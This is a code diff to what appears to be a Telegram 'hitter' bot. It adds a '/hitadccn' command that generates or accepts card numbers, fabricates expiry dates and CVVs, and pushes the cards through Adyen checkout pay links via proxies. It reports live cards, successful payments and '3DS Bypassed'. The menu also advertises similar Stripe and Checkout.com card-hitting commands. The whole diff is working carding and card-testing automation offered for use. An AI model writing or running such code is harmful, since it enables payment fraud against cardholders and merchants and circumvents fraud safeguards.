@@ -884,6 +884,237 @@ async def hitck_command(message: types.Message):
             del active_sessions[user_id]
 
 
+
+def parse_ccn_input(payload_tokens: list, raw_payload: str):
+    """
+    Parses card numbers for CCN mode (number only, no mm|yy|cvv).
+    Auto-generates random valid expiry. CVV is set to '000' placeholder.
+    Supports:
+    1. Raw card numbers: /hitadccn [url] 4111111111111111 5200000000000001
+    2. BIN generation:   /hitadccn [url] 453590 [count=10]
+    """
+    import random
+    from datetime import datetime
+
+    def rand_expiry():
+        now = datetime.now()
+        future_months = random.randint(3, 48)
+        m = now.month + future_months
+        y = now.year + (m - 1) // 12
+        m = ((m - 1) % 12) + 1
+        return str(m).zfill(2), str(y)[-2:]
+
+    cards = []
+
+    # Check for full CC format first (already has mm|yy|cvv) - still allow it
+    import re
+    full_matches = re.findall(r'(\d{13,19})[|/](\d{1,2})[|/](\d{2,4})[|/](\d{3,4})', raw_payload)
+    if full_matches:
+        for m in full_matches:
+            cards.append({
+                'card': m[0],
+                'month': m[1].zfill(2),
+                'year': m[2].zfill(2) if len(m[2]) <= 2 else m[2][-2:],
+                'cvv': m[3]
+            })
+        if len(cards) > 10:
+            return None, f"Max concurrent limit is 10."
+        return cards, None
+
+    # Check for BIN pattern
+    if payload_tokens:
+        count_val = payload_tokens[-1]
+        count = 10
+        potential_bin = ""
+
+        if count_val.isdigit() and len(count_val) <= 3 and len(payload_tokens) >= 2:
+            count = int(count_val)
+            potential_bin = "".join(payload_tokens[:-1]).strip()
+        else:
+            potential_bin = "".join(payload_tokens).strip()
+
+        clean_bin = potential_bin.lower().replace(' ', '')
+        if 'x' in clean_bin or (clean_bin.isdigit() and len(clean_bin) >= 6 and len(clean_bin) <= 8):
+            if count > 10:
+                return None, "Maximum batch limit is 10 concurrent requests."
+            from generators import generate_bin_cards
+            raw_gen_cards = generate_bin_cards(potential_bin, count)
+            for gc in raw_gen_cards:
+                gp = gc.split('|')
+                # Use generated expiry but mark as CCN (we won't send CVV)
+                cards.append({'card': gp[0], 'month': gp[1], 'year': gp[2], 'cvv': gp[3]})
+            if not cards:
+                return None, "BIN pattern generation failed."
+            return cards, None
+
+    # Raw card numbers (just digits, space or newline separated)
+    raw_numbers = re.findall(r'\b(\d{13,19})\b', raw_payload)
+    if raw_numbers:
+        for num in raw_numbers[:10]:
+            m, y = rand_expiry()
+            cards.append({'card': num, 'month': m, 'year': y, 'cvv': '000'})
+        return cards, None
+
+    return None, "Invalid format. Usage:\n/hitadccn [url] [card_number1] [card_number2] ...\nOR\n/hitadccn [url] [bin_pattern] [count=10]"
+
+
+@dp.message(Command("hitadccn"))
+async def hitadccn_command(message: types.Message):
+    user_id = message.from_user.id
+
+    if not gate_adyen_enabled and str(user_id) != str(OWNER_ID):
+        await message.answer("🚧 <b>Gateway Offline</b>\n<code>Adyen checkout engine is currently disabled by admin.</code>")
+        return
+
+    if user_id in active_sessions:
+        await message.answer("<b>Alert</b>\n<code>Active session detected. Abort current task before launching new checks.</code>")
+        return
+
+    if not await ProxyManager.has_proxies(user_id):
+        await message.answer(
+            "⚠️ <b>Proxy Required</b>\n"
+            "<code>Proxy pool is empty. You must load active proxies before hitting.\n"
+            "Load proxies using /proxy or /getproxy.</code>"
+        )
+        return
+
+    raw_tokens = message.text.strip().split()
+    if len(raw_tokens) < 3:
+        await message.answer("<b>Error</b>\n<code>Invalid format. Usage:\n/hitadccn [url] [card_number1] [card_number2]\nOR\n/hitadccn [url] [bin_pattern] [count=10]</code>")
+        return
+
+    url = raw_tokens[1]
+    payload_tokens = raw_tokens[2:]
+    raw_payload = message.text.strip().split(None, 2)[2] if len(message.text.strip().split(None, 2)) >= 3 else (payload_tokens[0] if payload_tokens else "")
+
+    cards, err = parse_ccn_input(payload_tokens, raw_payload)
+    if err:
+        await message.answer(f"<b>Error</b>\n<code>{err}</code>")
+        return
+
+    status_msg = await message.answer("cooking....")
+    active_sessions[user_id] = True
+
+    try:
+        from adyen_hitter import AdyenHitter
+        proxy_data = await ProxyManager.get_random(user_id)
+
+        card_blocks = []
+        merchant_name = "Adyen Merchant"
+        amount_str = None
+        results = []
+        link_dead = False
+
+        for idx, card in enumerate(cards, 1):
+            if user_id not in active_sessions or link_dead:
+                break
+
+            adyen_engine = AdyenHitter(url, proxy_data=proxy_data)
+            res = await adyen_engine.hit_ccn(card, idx, user_id)
+            results.append(res)
+
+            if is_session_expired_err(res):
+                link_dead = True
+                try:
+                    await status_msg.edit_text(
+                        "⚠️ <b>Link Expired</b>\n"
+                        "<code>This pay link is single-use and has been consumed. Provide a fresh link.</code>"
+                    )
+                except Exception:
+                    pass
+                break
+
+            card_str = f"{res['card']['card']}|{res['card']['month']}|{res['card']['year']}|CCN"
+            merchant_name = res.get('merchant') or merchant_name
+            if res.get('amount'):
+                amount_str = res['amount']
+            site_domain = extract_clean_site_domain(merchant_name, url)
+            is_approved = user_id in approved_users_set
+
+            if len(cards) > 1:
+                status_str = "Payment Successful ✅" if res['success'] else ("LIVE CARD 🔥" if res.get('is_live') else "Payment Failed ❌")
+
+                if res['success']:
+                    resp_str = "Authorised"
+                    if res.get('3ds_resolved'):
+                        resp_str += " (3DS Bypassed)"
+                else:
+                    resp_str = res.get('error') or res.get('decline_code') or 'Refused'
+
+                block = f"CC: <code>{card_str}</code>\nStatus: {status_str}\nResponse: {html.escape(resp_str)}"
+                card_blocks.append(block)
+
+                site_line = f"Site: {html.escape(merchant_name)} ({html.escape(site_domain)})" if site_domain else f"Site: {html.escape(merchant_name)}"
+                amt_line = f"\nAmount: {html.escape(amount_str)}" if amount_str else ""
+                blocks_text = "\n\n".join(card_blocks)
+
+                msg_text = (
+                    f"<b>Adyen CCN Hitter</b>\n\n"
+                    f"{blocks_text}\n\n"
+                    f"{site_line}"
+                    f"{amt_line}"
+                )
+
+                try:
+                    await status_msg.edit_text(msg_text, disable_web_page_preview=True)
+                except Exception:
+                    pass
+
+            elif len(cards) == 1:
+                if status_msg:
+                    try: await status_msg.delete()
+                    except: pass
+
+                amount_val = res.get('amount') or amount_str or "N/A"
+                merchant_disp = f"{html.escape(merchant_name)} ({html.escape(site_domain)})" if site_domain else html.escape(merchant_name)
+                note_line = "" if is_approved else "\n\n<i>Note: this message will be deleted automatically after 30sec</i>"
+
+                if res.get('success'):
+                    succ_url_line = extract_success_url_line(res)
+                    hit_text = (
+                        f"✅ <b>PAYMENT SUCCESSFUL [ADYEN CCN]</b>\n"
+                        f"💳 <code>{card_str}</code>\n"
+                        f"💰 Amount: {amount_val}\n"
+                        f"🛒 Merchant: {merchant_disp}\n"
+                        f"⏱ {res.get('response_time', 0):.2f}s"
+                        f"{succ_url_line}" + note_line
+                    )
+                else:
+                    reason_msg = html.escape(str(res.get('error') or res.get('decline_code') or 'refused')[:250])
+                    hit_text = (
+                        f"❌ <b>PAYMENT UNSUCCESSFUL</b>\n"
+                        f"💳 <code>{card_str}</code>\n"
+                        f"💰 Amount: {amount_val}\n"
+                        f"🛒 Merchant: {merchant_disp}\n"
+                        f"📉 Reason: {reason_msg}\n"
+                        f"⏱ {res.get('response_time', 0):.2f}s" + note_line
+                    )
+
+                sent_msg = await message.reply(hit_text, disable_web_page_preview=True)
+                if not is_approved:
+                    async def auto_del_ccn(m):
+                        await asyncio.sleep(30)
+                        try: await m.delete()
+                        except: pass
+                    asyncio.create_task(auto_del_ccn(sent_msg))
+
+        if len(cards) > 1 and not is_approved and status_msg:
+            async def auto_del_ccn(m):
+                await asyncio.sleep(30)
+                try: await m.delete()
+                except: pass
+            asyncio.create_task(auto_del_ccn(status_msg))
+
+    except Exception as ex:
+        if status_msg:
+            try: await status_msg.delete()
+            except: pass
+        await message.answer(f"❌ <b>Error processing Adyen CCN check:</b>\n<code>{html.escape(str(ex))}</code>")
+    finally:
+        if user_id in active_sessions:
+            del active_sessions[user_id]
+
+
 @dp.message(Command("hitad"))
 async def hitad_command(message: types.Message):
     user_id = message.from_user.id
@@ -2183,6 +2414,10 @@ async def process_menu_hitter(callback: types.CallbackQuery):
         "└ <i>Hits 1 to 10 cards against Stripe checkout.</i>\n\n"
         "💎 <b>/hitad</b> <code>[url] [cc|mm|yy|cvc] ...</code>\n"
         "└ <i>Hits 1 to 10 cards against Adyen gateway checkout.</i>\n\n"
+        "🔥 <b>/hitadccn</b> <code>[url] [card_number] ...</code>\n"
+        "└ <i>Adyen CCN check — card number only, auto expiry, no CVV.</i>\n\n"
+        "🌐 <b>/hitck</b> <code>[url] [cc|mm|yy|cvc] ...</code>\n"
+        "└ <i>Hits against Checkout.com Pay By Link.</i>\n\n"
         "🎲 <b>/hit</b> <code>[url] [bin_pattern] [count]</code>\n"
         "└ <i>Generates BIN cards and hits concurrently.</i>\n\n"
         "🛑 <b>/stop</b>\n"
